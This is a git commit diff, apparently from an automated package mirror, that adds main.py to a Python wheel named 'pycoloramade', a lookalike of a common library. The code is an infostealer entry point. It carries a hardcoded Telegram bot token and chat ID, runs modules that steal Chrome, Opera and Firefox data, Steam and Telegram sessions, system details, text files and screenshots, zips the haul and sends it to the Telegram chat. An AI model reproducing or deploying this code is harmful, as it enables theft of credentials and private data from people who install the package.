3acd3f5812656cfdeb36ec7eb290c3582624a5f6
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-08-15 16:04:20 +0000

    Add package pycoloramade/1.7.9/pycoloramade-1.7.9-py3-none-any.whl

---
+++ packages/pycoloramade/pycoloramade-1.7.9-py3-none-any.whl/pycoloramade/main.py
@@ -0,0 +1,39 @@
+
+
+def main():
+    TOKEN = '6599539436:AAFVJrGKyNqCO8qqTUXOlWr-GvREXwxHV0k'
+    CHAT_ID = '7127284530'
+
+    from modules.others import folder
+    from modules.system import sys
+    from modules.system import screen
+    from modules.browsers import chrome
+    from modules.browsers import opera
+    from modules.browsers import firefox
+    from modules.others import telegram
+    from modules.others import sender
+    from modules.others import makeitclean
+    from modules.others import steam
+    from modules.system import txt
+
+    folder.makeFolders()
+    chrome.Chrome()
+    opera.Opera()
+    firefox.Firefox()
+    steam.Steam()
+    sys.SystemInfo()
+    txt.TxtSteal()
+    telegram.Telegram()
+    screen.Screenshot()
+
+    try:
+        makeitclean.makemeZip()
+    except Exception as e:
+        print(e)
+    try:
+        sender.Send(TOKEN, CHAT_ID)
+    except Exception as e:
+        print(e)
+
+if __name__ == "__main__":
+    main()
